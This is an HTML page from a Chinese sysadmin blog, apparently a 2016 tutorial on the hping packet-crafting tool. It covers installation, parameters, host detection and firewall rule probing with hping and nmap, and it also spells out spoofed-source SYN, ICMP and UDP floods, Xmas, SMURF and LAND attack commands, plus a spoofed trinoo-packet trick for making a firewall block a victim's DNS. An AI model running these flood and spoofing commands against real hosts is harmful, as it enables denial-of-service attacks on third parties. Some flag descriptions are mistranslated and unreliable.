@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="Linux,运维,Nginx,Zabbix,Centos,Ansible,MySQL,Python,Docker,ELK,Haproxy,Git,Nodejs,安全,技术">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          Hping 使用方法详解 - 运维之美
+        
+    </title>
+
+    <link rel="canonical" href="https://www.hi-linux.com/posts/57862.html">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('/img/header_img/article.jpg')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Linux" title="Linux">Linux</a>
+                            
+                              <a class="tag" href="/tags/#技巧" title="技巧">技巧</a>
+                            
+                              <a class="tag" href="/tags/#工具" title="工具">工具</a>
+                            
+                              <a class="tag" href="/tags/#Hping" title="Hping">Hping</a>
+                            
+                              <a class="tag" href="/tags/#DDos" title="DDos">DDos</a>
+                            
+                        </div>
+                        <h1>Hping 使用方法详解</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Mike on
+                            2016-03-15
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">运维之美</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h3 id="原理基础">原理基础</h3>
+<p>Hping是一个命令行下使用的TCP/IP数据包组装/分析工具，其命令模式很像Unix下的ping命令，但是它不是只能发送ICMP回应请求，它还可以支持TCP、UDP、ICMP和RAW-IP协议，它有一个路由跟踪模式，能够在两个相互包含的通道之间传送文件。Hping常被用于检测网络和主机，其功能非常强大，可在多种操作系统下运行，如Linux，FreeBSD，NetBSD，OpenBSD，Solaris，MacOs X，Windows。</p>
+<p>HPING和ping的区别：典型ping程序使用的是ICMP回显请求来测试，而HPING可以使用任何IP报文，包括ICMP、TCP、UDP、RAWSOCKET。</p>
+<p>Hping的主要功能有：</p>
+<p>防火墙测试<br>
+实用的端口扫描<br>
+网络检测，可以用不同的协议、服务类型(TOS)、IP分片<br>
+手工探测MTU(最大传输单元)路径<br>
+先进的路由跟踪，支持所有的协议<br>
+远程操作系统探测<br>
+远程的运行时间探测<br>
+TCP/IP堆栈审计</p>
+<a id="more"></a>
+<h3 id="安装">安装</h3>
+<ul>
+<li>Centos</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install hping</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Debian/Ubuntu</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install hping</span><br></pre></td></tr></table></figure>
+<h3 id="hping的详细参数">Hping的详细参数</h3>
+<blockquote>
+<p>-h --help 显示帮助信息<br>
+-v --version 显示Hping的版本信息<br>
+-c --count 指定数据包的次数<br>
+-i --interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为10毫秒(附:秒、毫秒、微秒进率。1s=1000ms(毫秒)=1000000(微秒)，1s=10<sup>3ms(毫秒)=10</sup>6μs(微秒))<br>
+–fast 与-i m100等同，即每秒钟发送10个数据包(hping的间隔u表示微妙，－－fast表示快速模式，一秒10个包。)<br>
+-n --numeric 指定以数字形式输出,表示不进行名称解析。<br>
+-q --quiet 退出Hping<br>
+-I --interface 指定IP，如本机有两块网卡，可通过此参数指定发送数据包的IP地址。如果不指定则默认使用网关IP<br>
+-V --verbose 详细模式,一般显示很多包信息。<br>
+-D --debug 定义hping使用debug模式。<br>
+-z --bind 将ctrl+z 绑定到ttl，默认使用DST端口<br>
+-Z --unbind 解除ctrl+z的绑定</p>
+<p>指定所用的模式：<br>
+(缺省使用TCP进行PING处理)<br>
+-0 --rawip 裸IP方式,使用RAWSOCKET方式。<br>
+-1 --icmp ICMP 模式<br>
+-2 --udp UDP 模式<br>
+-8 --scan 扫描模式. (例: hping --scan 1-30,70-90 -S www.target.host)<br>
+-9 --listen 监听模式，会接受指定的信息。侦听指定的信息内容。</p>
+<p>IP选项：</p>
+<p>-a --spoof 源地址欺骗<br>
+–rand-dest 随机目的地址模式<br>
+–rand-source 随机源目的地址模式<br>
+-t --ttl ttl值，默认为64<br>
+-N --id 指定id，默认是随机的<br>
+-W --winid 使用win*的id 字节顺序,针对不同的操作系统。<br>
+-r --rel 相对的id区域<br>
+-f --frag 将数据包分片后传输(可以通过薄弱的acl(访问控制列表))<br>
+-x --morefrag 设置更多的分片标记<br>
+-y --dontfrag 设置不加分片标记<br>
+-g --fragoff 设置分片偏移<br>
+-m --mtu 设置虚拟MTU, 当数据包&gt;MTU时要使用–frag 进行分片<br>
+-o --tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助<br>
+-G --rroute 包含RECORD_ROUTE选项并且显示路由缓存<br>
+–lsrr 释放源路记录<br>
+–ssrr 严格的源路由记录<br>
+-H --ipproto 设置协议范围，仅在RAW IP模式下使用</p>
+<p>ICMP选项</p>
+<p>-C --icmptype 指定icmp类型（默认类型为回显请求）<br>
+-K --icmpcode 指定icmp编码（默认为0）<br>
+–force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） --icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0）<br>
+–icmp-ts 相当于–icmp --icmptype 13（ICMP时间戳）<br>
+–icmp-addr 相当于–icmp --icmptype 17（ICMP地址掩码）<br>
+–icmp-help 显示ICMP的其它帮助选项</p>
+<p>UDP/TCP选项</p>
+<p>-s --baseport 基本源端口（默认是随机的）<br>
+-p --destport 目的端口（默认为0），可同时指定多个端口<br>
+-k --keep 仍然保持源端口<br>
+-w --win 指定数据包大小，默认为64<br>
+-O --tcpoff 设置假的TCP数据偏移<br>
+-Q --seqnum 仅显示TCP序列号<br>
+-b --badcksum 尝试发送不正确IP校验和的数据包(许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和.)<br>
+-M --setseq 设置TCP序列号<br>
+-L --setack 使用TCP的ACK（访问控制列表）<br>
+-F --fin 使用FIN标记set FIN flag<br>
+-S --syn 使用SNY标记<br>
+-R --rst 使用RST标记<br>
+-P --push 使用PUSH标记<br>
+-A --ack 使用 ACK 标记<br>
+-U --urg 使用URG标记<br>
+-X --xmas 使用 X 未用标记 (0x40)<br>
+-Y --ymas 使用 Y 未用标记 (0x80)<br>
+–tcpexitcode 最后使用 tcp-&gt;th_flags 作为退出代码<br>
+–tcp-timestamp 启动TCP时间戳选项来猜测运行时间</p>
+<p>常规选项</p>
+<p>-d --data 数据大小，默认为0<br>
+-E --file 从指定文件中读取数据<br>
+-e --sign 增加签名<br>
+-j --dump 以十六进行形式转存数据包<br>
+-J --print 转存可输出的字符<br>
+-B --safe 启用安全协议<br>
+-u --end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始<br>
+-T --traceroute 路由跟踪模式<br>
+–tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出<br>
+–tr-keep-ttl 保持源TTL，对监测一个hop有用<br>
+–tr-no-rtt	 使用路由跟踪模式时不计算或显示RTT信息</p>
+<p>ARS数据包描述(新增加的内容，暂时还不稳定)<br>
+–apd-send 发送用描述APD的数据包</p>
+</blockquote>
+<h3 id="具体应用">具体应用</h3>
+<ul>
+<li>每秒送10个(-i u10000)ICMP(-1)<a href="http://xn--www-7j2e21bj57a.abc.net.tw" target="_blank" rel="noopener">封包到www.abc.net.tw</a> 伪造来源IP(-a)为100.100.100.100</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping www.abc.net.tw -1 -i u100000 -a 100.100.100.100</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：-1为数字非英文L</p>
+</blockquote>
+<ul>
+<li>每秒送1个(-i u1000000)TCP(default)封包到www.abc.net.tw的port 44444，伪造来源IP(-a)100.100.100.100使用的port为22222</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping www.abc.net.tw –i u1000000 –a 100.100.100.100 –s 22222 –p 44444</span><br></pre></td></tr></table></figure>
+<ul>
+<li>SYN Flooding(每秒10个封包)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping 目标主机IP –i u100000 –S –a 伪造来源IP</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伪造IP的ICMP封包(每秒10个封包)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping 目标主机IP –i u100000 –1 –a 伪造来源IP</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：-1为数字非英文</p>
+</blockquote>
+<ul>
+<li>不正常TCP Flag组合封包(每秒10个封包)</li>
+</ul>
+<p>(a)SYN+FIN</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping 目标主机IP –i u100000 –S –F –a 伪造来源IP</span><br></pre></td></tr></table></figure>
+<p>(b)X’mas</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping 目标主机IP –i u100000 –F –S –R –P –A –U –a 伪造来源IP</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伪造IP的UDP封包</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping 目标主机IP –i u100000 –2 –a 伪造来源IP</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伪造IP内含CodeRed封包</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping 目标主机IP –i u100000 –d [封包datasize] –E [filename] –a [伪造来源IP]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>SMURF攻击</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping2 -1 -a 192.168.1.5 192.168.1.255</span><br></pre></td></tr></table></figure>
+<ul>
+<li>XMAS TREE攻击</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping2 -SFRP 192.168.1.5</span><br></pre></td></tr></table></figure>
+<ul>
+<li>LAND攻击</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping2 -k -S -s 25 -p 25 -a 192.168.1.5 192.168.1.5</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用tcpdump记录流量</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#捕获25000个包,将原始报文转储到dumpfile中</span></span><br><span class="line">cron任务: 5 3 * * * /usr/sbin/tcpdump -c 25000 -w dumpfile -n</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看记录</span></span><br><span class="line">tcpdump -r dumpfile -X -vv</span><br></pre></td></tr></table></figure>
+<ul>
+<li>PING失效后的主机检测：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ping</span> 192.168.2.1</span><br><span class="line">PING 192.168.2.1 (192.168.2.1) 56(84) bytes of data.</span><br><span class="line">--- 192.168.2.1 ping statistics ---</span><br><span class="line">19 packets transmitted, 0 received, 100% packet loss, time 18009ms</span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"><span class="variable">$hping2</span> -c 4 -n -i 2 192.168.2.1</span><br><span class="line">HPING 192.168.2.1 (eth0 192.168.2.1): NO FLAGS are <span class="built_in">set</span>, 40 headers + 0 data bytes</span><br><span class="line">len=46 ip=192.168.2.1 ttl=64 id=43489 sport=0 flags=RA seq=0 win=0 rtt=1.0 ms</span><br><span class="line">len=46 ip=192.168.2.1 ttl=64 id=43490 sport=0 flags=RA seq=1 win=0 rtt=0.6 ms</span><br><span class="line">len=46 ip=192.168.2.1 ttl=64 id=43491 sport=0 flags=RA seq=2 win=0 rtt=0.7 ms</span><br><span class="line">len=46 ip=192.168.2.1 ttl=64 id=43498 sport=0 flags=RA seq=3 win=0 rtt=0.6 ms</span><br><span class="line">--- 192.168.2.1 hping statistic ---</span><br><span class="line">4 packets transmitted, 4 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 0.6/0.8/1.0 ms</span><br></pre></td></tr></table></figure>
+<p>-c 发送4个报文-n不进行名称解析 -i包发送时间间隔。</p>
+<p>好处：即使主机阻塞了ICMP报文，也可以显示主机是否在运行的信息，在关掉ICMP的探测有效！<br>
+显示信息解释：len，返回ip报文大小；ttl； id，IP的ID域；sport，源端口，flags，返回的IP报设置的TCP标志 （R：RESET，A：ACK；S：SYN；F：FIN；P：PUSH；U：URGENT）；seq：序列号；win：tcp窗口大小；rtt：往返 时，EIGRP似乎有这个设置。</p>
+<ul>
+<li>更复杂的实际的例子</li>
+</ul>
+<p>step 1:目标主机安装了blackice，它的ip address是ip.add.of.victim<br>
+step 2:发起攻击的一台linux 机器，上面安装了hping</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">执行如下命令</span><br><span class="line"><span class="comment">#hping -p 31335 -e PONG -2 ip.add.of.victim -c 5 -d 4 -a ip.add.of.dnsserver</span></span><br><span class="line"></span><br><span class="line">HPING ip.add.of.victim (eth0 ip.add.of.victim): udp mode <span class="built_in">set</span>, 28 headers</span><br><span class="line">+ 4 data bytes</span><br><span class="line">--- ip.add.of.victim hping statistic ---</span><br><span class="line">5 packets tramitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line"></span><br><span class="line"><span class="comment">#hping -p 31335 -e PONG -2 ip.add.of.victim -c 5 -d 4 -a www.google.com</span></span><br><span class="line"></span><br><span class="line">HPING ip.add.of.victim (eth0 ip.add.of.victim): udp mode <span class="built_in">set</span>, 28 headers</span><br><span class="line">+ 4 data bytes</span><br><span class="line">--- ip.add.of.victim hping statistic ---</span><br><span class="line">5 packets tramitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line"></span><br><span class="line"><span class="comment">#hping -p 31335 -e PONG -2 ip.add.of.victim -c 5 -d 4 -a www.sina.com</span></span><br><span class="line">HPING ip.add.of.victim (eth0 ip.add.of.victim): udp mode <span class="built_in">set</span>, 28 headers</span><br><span class="line">+ 4 data bytes</span><br><span class="line">--- ip.add.of.victim hping statistic ---</span><br><span class="line">5 packets tramitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br></pre></td></tr></table></figure>
+<p>上面的三个命令干了同一件事情，以伪造的ip发送假的trinoo攻击数据包.</p>
+<p>结果:在目标主机上所有伪造的ip地址网络连接被block了，也就是对目标主机ip.add.of.victim而言，它的dns服务器，google和sina都无法访问了。<br>
+我很怀疑目前的个人防火墙只要存在auto-block功能，就存在这一问题。</p>
+<ul>
+<li>防火墙规则测试</li>
+</ul>
+<p>hping有类似NMAP的方法来检测并收集关于潜在的防火墙的规则和能力的信息。<br>
+如果一个主机对ping没有任何相应，而对hping有响应，假定目标的主机为192.168.2.234.<br>
+一旦主机对hping作出了响应,那么下一步我们先用nmap先进行一个端口扫描,当然这个hping2也可以作.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -P0 -p 21-25 192.168.2.234</span><br><span class="line">Starting Nmap 4.53 ( http://insecure.org ) at 2008-08-14 15:56 CST</span><br><span class="line">Interesting ports on 192.168.2.234:</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp open ssh</span><br><span class="line">23/tcp filtered telnet</span><br><span class="line">24/tcp filtered priv-mail</span><br><span class="line">25/tcp filtered smtp</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.379 seconds</span><br></pre></td></tr></table></figure>
+<p>以上信息显示除了ssh端口外,其他端口被阻塞.然后可以试试用hping向各个被阻塞的端口发送空的报文.用-p的开关,可以对指定的目的端口进行hping.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hping2 -p 21 192.168.2.234</span><br><span class="line">HPING 192.168.2.234 (eth0 192.168.2.234): NO FLAGS are <span class="built_in">set</span>, 40 headers + 0 data bytes</span><br><span class="line">24: len=46 ip=192.168.2.234 ttl=128 id=2461 sport=24 flags=RA seq=7 win=0 rtt=0.7 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=2462 sport=24 flags=RA seq=8 win=0 rtt=0.7 ms</span><br><span class="line">25: len=46 ip=192.168.2.234 ttl=128 id=2463 sport=25 flags=RA seq=9 win=0 rtt=0.7 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=2464 sport=24 flags=RA seq=10 win=0 rtt=0.7 ms</span><br></pre></td></tr></table></figure>
+<p>前三个端口没有响应,端口24 25 获得了RST/ACK响应.这说明,虽然这些端口被禁止PING,但没有工具在该端口上监听.然而为什么NMAP没有得到响应,因为NMAP虽然使用 TCP连接,但它在TCP报头中设置了TCP SYN标记位,而HPING 使用了空标记的报文,这就告诉我们说,在主机192.168.2.234上只阻塞进入的TCP连接.接下来使用hping创建一个SYN报文然后将其发送 到5个端口再测试.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hping2 -S -p 21 192.168.2.234</span><br><span class="line">HPING 192.168.2.234 (eth0 192.168.2.234): S <span class="built_in">set</span>, 40 headers + 0 data bytes</span><br><span class="line">22: len=46 ip=192.168.2.234 ttl=128 id=10722 sport=22 flags=SA seq=1 win=0 rtt=1.2 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=10747 sport=22 flags=SA seq=2 win=0 rtt=0.7 ms</span><br></pre></td></tr></table></figure>
+<p>这次只有22端口响应,说明SSH端口是开放的,但有工具在上面监听,该端口没有进行过滤.<br>
+然后我们再创建一个ACK报文并发送:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hping2 -A -p 21 192.168.2.234</span><br><span class="line">HPING 192.168.2.234 (eth0 192.168.2.234): A <span class="built_in">set</span>, 40 headers + 0 data bytes</span><br><span class="line">22: len=46 ip=192.168.2.234 ttl=128 id=12707 sport=22 flags=R seq=2 win=0 rtt=0.7 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=12708 sport=22 flags=R seq=3 win=0 rtt=0.7 ms</span><br><span class="line">23: len=46 ip=192.168.2.234 ttl=128 id=12709 sport=23 flags=R seq=4 win=0 rtt=0.7 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=12710 sport=22 flags=R seq=5 win=0 rtt=0.7 ms</span><br><span class="line">24: len=46 ip=192.168.2.234 ttl=128 id=12711 sport=24 flags=R seq=6 win=0 rtt=0.7 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=12712 sport=22 flags=R seq=7 win=0 rtt=0.7 ms</span><br><span class="line">25: len=46 ip=192.168.2.234 ttl=128 id=12712 sport=25 flags=R seq=8 win=0 rtt=0.8 ms</span><br><span class="line">len=46 ip=192.168.2.234 ttl=128 id=12713 sport=22 flags=R seq=9 win=0 rtt=0.7 ms</span><br></pre></td></tr></table></figure>
+<p>结果除了21端口外所有端口都响应了RST,说明了:<br>
+1.端口22是开放的,但有工具在上面监听.<br>
+2.24 25 上面没有工具监听,对NULL报文回显.<br>
+3.端口23针对ACK报文以RST进行了响应,但没有响应NULL报文.说明该端口被过滤,但是telnet服务运行在192.168.2.234上.<br>
+4.阻塞了进入的SYN报文但允许其他TCP报文通过,说明它采用的不是基于状态的报文防火墙.</p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/posts/20834.html" data-toggle="tooltip" data-placement="top" title="批量杀死 MySQL 连接的几种方法">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/posts/17756.html" data-toggle="tooltip" data-placement="top" title="Https(SSLTLS)原理详解">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+
+                
+                    <!-- disqus 评论框 start -->
+                    <div class="comment">
+                        <div id="lv-container" data-id="city" data-uid="MTAyMC8yNzg2My80NDQw"></div>
+                    </div>
+                    <!-- disqus 评论框 end -->
+                
+
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+  
+    <style>
+      span.toc-nav-number{
+        display: none
+      }
+    </style>
+  
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理基础"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">原理基础</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#安装"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">安装</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#hping的详细参数"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">Hping的详细参数</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#具体应用"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">具体应用</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Linux" title="Linux">Linux</a>
+                        
+                          <a class="tag" href="/tags/#技巧" title="技巧">技巧</a>
+                        
+                          <a class="tag" href="/tags/#工具" title="工具">工具</a>
+                        
+                          <a class="tag" href="/tags/#Hping" title="Hping">Hping</a>
+                        
+                          <a class="tag" href="/tags/#DDos" title="DDos">DDos</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://www.mike.org.cn/" target="_blank">简单.生活</a></li>
+                    
+                        <li><a href="http://shang.qq.com/wpa/qunwpa?idkey=ea4c43493c2269428ac6ef6141de4b6d78e5ab2d41380ca4099b833b62884ee9" target="_blank">技术交流群</a></li>
+                    
+                        <li><a href="" target="_blank"></a></li>
+                    
+                        <li><a href="" target="_blank"></a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+    <!-- 来必力City版公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+       (function(d, s) {
